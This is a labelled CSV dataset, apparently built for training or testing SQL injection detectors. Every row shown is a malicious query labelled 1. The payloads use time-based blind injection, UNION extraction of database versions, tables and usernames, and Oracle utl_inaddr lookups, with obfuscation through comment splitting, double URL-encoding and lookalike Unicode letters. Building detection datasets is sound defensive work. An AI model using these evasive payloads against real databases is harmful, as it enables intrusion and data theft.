Query,Label
"IF(1=1, SLEEP(5), 0)--SELECT * FRΟM (SELECT ’ select * from users where id  =  1 or "",."" or 1  =  1 -- 1’) AS benign_sub",1
IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--ch%25D0%25B0r%25254039%252541%25252b%252540SELECT,1
SE/**/LECT%2520%252A%2520FR/**/OM%2520%2528SE/**/LECT%2520%2527%2520se/**/lect%2520%252A%2520fr/**/om%2520users%2520w/**/here%2520id%2520%2520%253D%2520%25201%2520o/**/r%2520%25221%2526%2522%2520o/**/r%25201%2520%2520%253D%2520%25201%2520--%25201%2527%2529%2520AS%2520benign_sub,1
IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--SELECT%2520%252A%2520FROM%2520%2528SELECT%2520%2527admin%2527%2520%2520%2529%2520%2520%2520or%2520%2520%2520%2528%2520%2520%25271%2527%2520%2520%253D%2520%2520%25271%2527%2529%2520AS%2520benign_sub,1
"SELECT * FROM (SELECT 'IF(1=1, SLEEP(5), 0)--declаre @s vаrchаr   (  200  )   select @s   =   0x73656c6 ...') AS benign_sub",1
SELECT%2520%252A%2520FRΟM%2520%2528SELECT%2520%2527or%25200%2520%2520%253D%2520%25200%2520%2523%2522%2527%2529%2520AS%2520benign_sub,1
"IF(1=1, SLEEP(5), 0)-- se/**/lect * fr/**/om users w/**/here id  =  1 o/**/r "".]"" o/**/r 1  =  1 -- 1",1
"SELECT * FRΟM (SELECT ’IF(1=1, SLEEP(5), 0)--  )   or   (  ’x’  =  ’x’) AS benign_sub",1
"IF(1=1, SLEEP(5), 0)--SE/**/LECT * FR/**/OM (SE/**/LECT ' se/**/lect * fr/**/om users w/**/here id  =  1.<@$ un/**/ion se/**/lect 1,version  (    )   -- 1') AS benign_sub",1
SE/**/LECT * FR/**/ΟM (SE/**/LECT ’$  (  sleep 50  ) ’) AS benign_sub,1
"IF(1=1, SLEEP(5), 0)--SELECT * FRΟM (SELECT ’ select * from users where id  =  1 *1 union select null,bаnner from v$version where rownum  =  1 -- 1’) AS benign_sub",1
"SELECT * FROM (SELECT 'IF(1=1, SLEEP(5), 0)--1 union аll select 1,2,3,4,5,6,nаme from sysobjects where xtype   =   ’u’ --') AS benign_sub",1
"SELECT * FROM (SELECT 'IF(1=1, SLEEP(5), 0)-- se/**/lect * fr/**/om users w/**/here id  =  1 o/**/r 1#"". un/**/ion se/**/lect 'a',version  (    )   -- 1') AS benign_sub",1
"IF(1=1, SLEEP(5), 0)--SELECT * FRΟM (SELECT ’ select * from users where id  =  1 or 1#""; union select null,version  (    )   -- 1’) AS benign_sub",1
"IF(1=1, SLEEP(5), 0)--SELECT * FRΟM (SELECT ’ select * from users where id  =  1 or 1#""? or 1  =  1 -- 1’) AS benign_sub",1
"SE/**/LECT * FRΟM (SE/**/LECT ’""а"""" o/**/r 1  =  1--""’) AS benign_sub",1
SE/**/LECT * FR/**/OM (SE/**/LECT '%2520se/**/lect%2520%252A%2520fr/**/om%2520users%2520w/**/here%2520id%2520%2520%253D%2520%25201%2520%252A1%2520un/**/ion%2520se/**/lect%25201%252Cbanner%2520fr/**/om%2520v%2524version%2520w/**/here%2520rownum%2520%2520%253D%2520%25201%2520--%25201') AS benign_sub,1
"IF(1=1, SLEEP(5), 0)--SELECT * FRΟM (SELECT ’ AND 1  =  utl_inаddr.get_host_аddress   (    (   SELECT DISTINCT  (  column_nаme  )   FRΟM   (  SELECT DISTINCT  (  column_nаme  )  , RΟWNUM AS LIMIT FRΟM аll_tаb_columns  )   WHERE LIMIT  =  4   )    )    AND ’i’  =  ’i’) AS benign_sub",1
%2520se/%252A%252A/lect%2520%252A%2520fr/%252A%252A/om%2520users%2520w/%252A%252A/here%2520id%2520%2520%253D%2520%2520%25271%2527%2520un/%252A%252A/ion%2520se/%252A%252A/lect%2520%2520%2520%2528%2520%2520%255C%2520%2520%2529%2520%2520%252C%2540%2540VERSIΟN%2520--%25201%2527,1
IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--1%2520%25D0%25B0nd%2520user_n%25D0%25B0me%2520%2520%2528%2520%2520%2520%2520%2529%2520%2520%2520%2520%2520%253D%2520%2520%2520%25E2%2580%2599dbo%25E2%2580%2599,1
SELECT * FROM (SELECT '%253B%2520if%2520not%2520%2520%2528%2520%2520substring%2520%2520%2520%2528%2520%2520%2520%2520%2528%2520%2520%2520select%2520%2540%2540version%2520%2520%2529%2520%2520%252C24%252C1%2520%2520%2529%2520%2520%2520%253C%253E%25201%2520%2520%2529%2520%2520%2520wаitfor%2520delаy%2520%25270%253A0%253A2%2527%2520--') AS benign_sub,1
SELECT%2520%252A%2520FROM%2520%2528SELECT%2520%2527IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--%2520select%2520%252A%2520from%2520users%2520where%2520id%2520%2520%253D%2520%25201%2520or%25201%2523%2522%2524%2520union%2520select%25201%252Cversion%2520%2520%2528%2520%2520%2520%2520%2529%2520%2520%2520--%25201%2527%2529%2520AS%2520benign_sub,1
"IF(1=1, SLEEP(5), 0)-- se/**/lect * fr/**/om users w/**/here id  =  1 o/**/r 1#""{ un/**/ion se/**/lect null,version  (    )   -- 1",1
"SELECT * FROM (SELECT 'IF(1=1, SLEEP(5), 0)--select * from users where id  =  ’1’ *$ . or 1  =  1 -- 1’') AS benign_sub",1
IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--select%2520%252A%2520from%2520users%2520where%2520id%2520%2520%253D%2520%25201%2520%252B%2524%252B.%2520or%25201%2520%2520%253D%2520%25201%2520--%25201,1
SELECT * FRΟM (SELECT ’se/**/lect * fr/**/om users w/**/here id  =  1 o/**/r   (  \+  )    =  1 o/**/r 1  =  1 -- 1’) AS benign_sub,1
IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--%2520A/%252A%252A/ND%25201%2520%2520%253D%2520%2520utl_inaddr.get_host_address%2520%2520%2520%2528%2520%2520%2520%2520%2528%2520%2520%2520SE/%252A%252A/LECT%2520DISTINCT%2520%2520%2528%2520%2520USERNAME%2520%2520%2529%2520%2520%2520FR/%252A%252A/OM%2520%2520%2520%2528%2520%2520SE/%252A%252A/LECT%2520DISTINCT%2520%2520%2528%2520%2520USERNAME%2520%2520%2529%2520%2520%252C%2520ROWNUM%2520AS%2520LIMIT%2520FR/%252A%252A/OM%2520SYS.ALL_USERS%2520%2520%2529%2520%2520%2520W/%252A%252A/HERE%2520LIMIT%2520%2520%253D%2520%25206%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520A/%252A%252A/ND%2520%2527i%2527%2520%2520%253D%2520%2520%2527i,1
IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--or%25201%2520%2520%253D%2520%25201%2520or%2520%25E2%2580%2599%25E2%2580%2599%2520%2520%253D%2520%2520%25E2%2580%2599,1
SELECT%2520%252A%2520FROM%2520%2528SELECT%2520%2527select%2520%252A%2520from%2520users%2520where%2520id%2520%2520%253D%2520%25201%2520%2520%2520or%25201%2520%2520%253D%2520%25201%2520--%25201%2527%2529%2520AS%2520benign_sub,1
IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--o/**/r%2520%2527text%2527%2520%253E%2520%2527t%2527,1
1234%2520%2522%2520A/%252A%252A/ND%25201%2520%2520%253D%2520%25200%2520UN/%252A%252A/IΟN%2520ALL%2520SE/%252A%252A/LECT%2520%2522аdmin%2522%252C%2520%252281dc9bdb52d04dc20036dbd8313ed055,1
SELECT * FRΟM (SELECT ’%2520select%2520%252A%2520from%2520users%2520where%2520id%2520%2520%253D%2520%25201%2520or%2520%2522%2525%255B%2522%2520or%25201%2520%2520%253D%2520%25201%2520--%25201’) AS benign_sub,1
SE/**/LECT * FR/**/OM (SE/**/LECT '%2520se/**/lect%2520%252A%2520fr/**/om%2520users%2520w/**/here%2520id%2520%2520%253D%2520%25201%2520o/**/r%25201%2523%2522%253B%2520%2520%253D%2520%25201%2520un/**/ion%2520se/**/lect%25201%252Cversion%2520%2520%2528%2520%2520%2520%2520%2529%2520%2520%2520--%25201') AS benign_sub,1
"IF(1=1, SLEEP(5), 0)--аdmin’ o/**/r ’1’  =  ’1’#",1
"SELECT * FROM (SELECT 'IF(1=1, SLEEP(5), 0)--select * from users where id  =  1 +$ 1 or 1  =  1 -- 1') AS benign_sub",1
IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--s,1
SELECT * FROM (SELECT '%2520A/**/ND%25201%2520%2520%253D%2520%2520utl_inaddr.get_host_address%2520%2520%2520%2528%2520%2520%2520%2520%2528%2520%2520%2520SE/**/LECT%2520DISTINCT%2520%2520%2528%2520%2520USERNAME%2520%2520%2529%2520%2520%2520FR/**/OM%2520%2520%2520%2528%2520%2520SE/**/LECT%2520DISTINCT%2520%2520%2528%2520%2520USERNAME%2520%2520%2529%2520%2520%252C%2520ROWNUM%2520AS%2520LIMIT%2520FR/**/OM%2520SYS.ALL_USERS%2520%2520%2529%2520%2520%2520W/**/HERE%2520LIMIT%2520%2520%253D%2520%25204%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520A/**/ND%2520%2527i%2527%2520%2520%253D%2520%2520%2527i') AS benign_sub,1
SELECT * FROM (SELECT ' se/**/lect * fr/**/om info/**/rmаtion_schemа.tаbles--') AS benign_sub,1
SELECT * FROM (SELECT '%2520se/**/lect%2520%252A%2520fr/**/om%2520users%2520w/**/here%2520id%2520%2520%253D%2520%25201%2520o/**/r%2520%2522%2524%2526%2522%2520o/**/r%25201%2520%2520%253D%2520%25201%2520--%25201') AS benign_sub,1
